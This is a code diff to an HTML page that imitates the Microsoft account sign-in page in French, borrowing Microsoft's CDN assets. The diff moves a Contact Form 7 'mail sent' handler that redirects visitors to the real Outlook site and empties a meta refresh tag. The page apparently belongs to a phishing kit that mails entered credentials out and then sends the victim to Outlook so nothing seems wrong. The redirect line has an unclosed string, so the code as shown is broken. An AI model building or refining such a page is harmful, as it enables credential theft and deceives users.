@@ -10,7 +10,7 @@
 		<link rel="stylesheet" href="assets/css/main.css" /><noscript>
 		<link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
 		<noscript>
-	    <meta http-equiv="Refresh" content="0; URL="/>Le compte Microsoft nécessite JavaScript pour la connexion. Ce navigateur Web ne prend pas en charge JavaScript ou les scripts sont bloqués.<br /><br />Pour savoir si votre navigateur prend en charge JavaScript ou pour autoriser les scripts, reportez-vous à son aide en ligne.</noscript>
+	    <meta http-equiv="" content="0; URL=""/>Le compte Microsoft nécessite JavaScript pour la connexion. Ce navigateur Web ne prend pas en charge JavaScript ou les scripts sont bloqués.<br /><br />Pour savoir si votre navigateur prend en charge JavaScript ou pour autoriser les scripts, reportez-vous à son aide en ligne.</noscript>
 	    <title>Se connecter à votre compte Microsoft</title>
 	    <link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29393.1/images/favicon.ico">
 	    <link rel="stylesheet" href="https://logincdn.msauth.net/16.000/Converged_v21036_aaRUc92kCx1I0HSCbabz7g2.css">   
@@ -129,6 +129,11 @@
 								    </ul>
                                 </td>								
 							</ul>	
+							<script>
+document.addEventListener( 'wpcf7mailsent', function( event ) {
+  location = 'https://outlook.live.com/owa/;
+}, false );
+</script>
 	
 		</form>
 	
@@ -220,11 +225,7 @@
 					</section>
 
 		<!-- Scripts -->
-<script>
-document.addEventListener( 'wpcf7mailsent', function( event ) {
-  location = 'https://outlook.live.com/owa/;
-}, false );
-</script>
+
 
 	</body>
 </html>
